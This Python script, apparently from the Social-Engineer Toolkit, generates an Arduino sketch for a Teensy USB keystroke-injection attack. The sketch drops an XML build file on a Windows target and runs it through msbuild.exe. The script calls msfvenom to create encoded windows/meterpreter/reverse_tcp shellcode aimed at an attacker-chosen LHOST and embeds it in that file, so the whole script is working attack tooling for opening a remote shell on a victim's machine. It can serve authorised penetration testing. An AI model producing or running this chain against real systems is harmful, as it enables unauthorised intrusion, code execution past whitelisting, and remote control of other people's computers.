#!/usr/bin/python
from __future__ import print_function
import os,subprocess,sys
import teensy_gen

try:
    input = raw_input
except NameError:
    pass

# Python script to automate the generation of ino files for the Teensy HID attack executing shellcode using msbuild.exe
# This appears to be functional with my limited testing so if you know a better way please feel free to improve.
# The code below takes the files listed containing embedded labels and formats their contents to form the ino file.
# Commands and shellcode are injected at the appropriate places indicated by the labels.
# Mike Judge April 2017

# Declare required variables for shellcode generation
meta_path = '/usr/share/metasploit-framework/'                              # File path to metasploit - std SET msf_path = meta_path().
lhost_ipaddr = '192.168.50.5'                                               # Local host LHOST ip address.                                  --Make user selectable--
shell_arch = 'x86'                                                          # Shellcode architecture.                                       --Make user selectable--
shell_plat = 'Windows'                                                      # Shellcode platform.                                           --Make user selectable--
payload = 'windows/meterpreter/reverse_tcp'                                 # Metasploit payload to be generated.                           --Make user selectable--
encap = 'x86/shikata_ga_nai'                                                # Shellcode encpsulation.                                       --Make user selectable--
shell_format = 'csharp'                                                     # Shellcode output formatting.

# Declare required variables for formatting shellcode for ino file
start_pos = 35                                                              # Value for the next char in the string for line 2 to start.
end_pos = 0                                                                 # Set end_pos to 0.
width = 75                                                                  # Value for the width of the shellcode for each line.

# Variables for teensy_gen.cmd_at_run_gen
enviro_var = '%USERPROFILE%'                                                # Environmental variable where the xml file will be located to be run by msbuild.exe    --Make user selectable--
xml_output_filename = 'ShellcodeRunner.xml'                                 # Name of the xml file containing the csharp build commands to be run by msbuild.exe    --Make user selectable--
build_path = 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe'   # Path to msbuild.exe - needs to have \ escaped with \\ to prevent issues.          --Make user selectable--

# Variables for external files
ino_output_filename = '/usr/share/setoolkit/src/teensy/ino_file_gen.ino'                                    # Filename of the final ino file containing the generated arduino code and xml build config for msbuild.
ino_header_filename = '/usr/share/setoolkit/src/teensy/ino_header.txt'                                      # File containg the header arduino code to be incorporated into the ino file before the xml build config.
ino_tail_filename  = '/usr/share/setoolkit/src/teensy/ino_tail.txt'                                         # File containg the header arduino code to be incorporated into the ino file after the xml build config.
xml_input_filename = '/usr/share/setoolkit/src/teensy/ino_build_file.xml'                                   # File containing the xml build structure to be incorporated into the ino file.

# User selection - default values
print('\n-----default settings for shellcode generation-----\n')
print('LHOST                           - '+lhost_ipaddr)
print('Shell Architecture              - '+shell_arch)
print('Shell platform                  - '+shell_plat)
print('Payload                         - '+payload)
print('Encapsulation                   - '+encap)
print('\n-----default settings for C# XML file-----\n')
print('User variable for file location - '+enviro_var)
print('XML Output filename             - '+xml_output_filename)
print('Location of msbuild.exe         - '+build_path+'\n')

# User selection - Choices
change_settings = input("\nWould you like to change the default settings (y/n)")
if change_settings in ('y', 'Y'):
    lhost_ipaddr = teensy_gen.check_input(lhost_ipaddr, input("\nPlease enter the new LHOST ip address - "))
    shell_arch = teensy_gen.check_input(shell_arch, input("Please enter the new shellcode architecture (choices) - "))
    shell_plat = teensy_gen.check_input(shell_plat, input("Please enter the new shellcode platform (choices) - "))
    payload = teensy_gen.check_input(payload, input("Please enter the new shellcode payload - "))
    encap = teensy_gen.check_input(encap, input("Please enter the new shellcode encpsulation - "))
    enviro_var = teensy_gen.check_input(enviro_var, input("Please enter the new environmental variable for the file location - "))
    xml_output_filename = teensy_gen.check_input(xml_output_filename, input("Please enter the new filename for the XML output file - "))
    build_path = teensy_gen.check_input(build_path, input("Please enter the new location of msbuild.exe - "))
else:
    print('\n-----Using default settings-----\n')

# Main code

with open(ino_output_filename,'wb') as ino_output_file:                     # Open the ino output file as a write to receive the formatted text.
    if os.path.isfile(ino_header_filename):
        with open(ino_header_filename,'rb') as ino_header_file:             # Open the ino header file as readonly.
            print('-----Formatting ino header file-----')                    # Progress notification to the user.
            for ino_header_line in ino_header_file:                         # Read each line from the file.
                ino_header_line = ino_header_line.rstrip()                  # Strip the formatting on the rhs of each line.
                if ( ino_header_line == '-----create-----'):                # Check for the presence of the create label.
                    ino_output_file.writelines( teensy_gen.cmd_at_run_gen('cmd /c echo 0 >',enviro_var,xml_output_filename) + '\n' )  # Insert create command into the location defined by the label.
                else:
                    if ( ino_header_line == '-----notepad-----'):           # Check for the presence of the notepad label.
                        ino_output_file.writelines( teensy_gen.cmd_at_run_gen('notepad',enviro_var,xml_output_filename) + '\n' ) # Insert notepad command into the location defined by the label.
                    else:
                        ino_output_file.writelines( ino_header_line + '\n' )    # Write the ino header line to the ino file.

        ino_header_file.close()                                             # Close the ino header file.
    else:
        sys.exit('-----Exiting file - '+ino_header_filename+' does not exist-----')

    ino_output_file.writelines( '\n' )                                      # Create new line in the ino_output_file.

    if os.path.isfile(xml_input_filename):
        with open(xml_input_filename,'rb') as xml_include_file:             # Open the XML file.
            print('-----Formatting XML file for ino file-----')              # Progress notification to the user.
            for input_line in xml_include_file:                             # Read each line from the file.
                input_line = input_line.rstrip()                            # Strip the formatting on the rhs of each line.
                input_line = input_line.replace("\\", "\\\\")               # Escape the \ in each line using \\.
                input_line = input_line.replace("\"", "\\\"")               # Escape the " in each line using \".

                if ( input_line == '-----shellcode-----'):                  # Check for the presence of the shellcode label.
                    # generate the shellcode using msfvenom
                    print('-----Generating shellcode-----')                  # Progress notification to the user.
                    proc = subprocess.Popen("%smsfvenom -a %s --platform %s -p %s LHOST=%s -e %s -f %s -v shellcode" % (meta_path,shell_arch,shell_plat,payload,lhost_ipaddr,encap,shell_format), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                    # read in the generated shellcode using stdout
                    payload_shellcode = proc.stdout.read()                  # assign the output of stdout to the variable payload_shellcode.
                    length = len(payload_shellcode)                         # assign the string length of the generated shellcode to the var length.
                    payload_shellcode = payload_shellcode.strip()           # Strip formatting from the payload.

                    print('-----Formatting shellcode for ino file-----')     # Progress notification to the user.
                    ino_output_file.writelines( teensy_gen.ino_print_gen(payload_shellcode[0:34] ) + '\n' )  # format first line as shorter than rest.

                    while (start_pos <= length):                            # format the remaning lines of shellcode.
                        end_pos = start_pos + width                         # Set the position of end_pos.
                        if (end_pos >= (length - 3)):                       # Check if end position is greater than the length of the shellcode.
                            end_pos = length                                 # set the end position for the last line.
                        ino_output_file.writelines( teensy_gen.ino_print_gen(payload_shellcode[start_pos:end_pos] ) + '\n' ) # Print formatted shellcode section between start_pos and end_pos.
                        start_pos = end_pos + 1                             # move the start_pos to the next position from the end of the previous.
                else:                                                       # If not the shellcode label.
                    ino_output_file.writelines( teensy_gen.ino_print_gen(input_line) + '\n' ) # Format the line and inject into the ino file.

        xml_include_file.close()                                            # Close the XML file.

    else:
        sys.exit('-----Exiting file - '+xml_input_filename+' does not exist-----')

    if os.path.isfile(ino_tail_filename):
        with open(ino_tail_filename,'rb') as ino_tail_file:                 # Open the ino tail file.
            print('-----Formatting ino tail file-----')                      # Progress notification to the user.
            for ino_tail_line in ino_tail_file:                             # Read each line from the file.
                ino_tail_line = ino_tail_line.rstrip()                      # Strip the formatting on the rhs of each line.
                if ( ino_tail_line == '-----build-----'):                   # Check for the presence of the build label.
                    ino_output_file.writelines( teensy_gen.cmd_at_run_gen(build_path,enviro_var,xml_output_filename) + '\n')  # Insert the build command into the location defined by the label.
                else:
                    ino_output_file.writelines( ino_tail_line + '\n' )      # Write the ino tail line to the ino file.

        ino_tail_file.close()                                               # Close the ino tail file.

        print('-----Finished creating ino file ino_file_gen.ino-----')       # Progress notification to the user.
        user_return = input("Please press any key")
    else:
        sys.exit('-----Exiting file - '+ino_tail_filename+' does not exist-----')

ino_output_file.close()                                                     # Close the ino file.
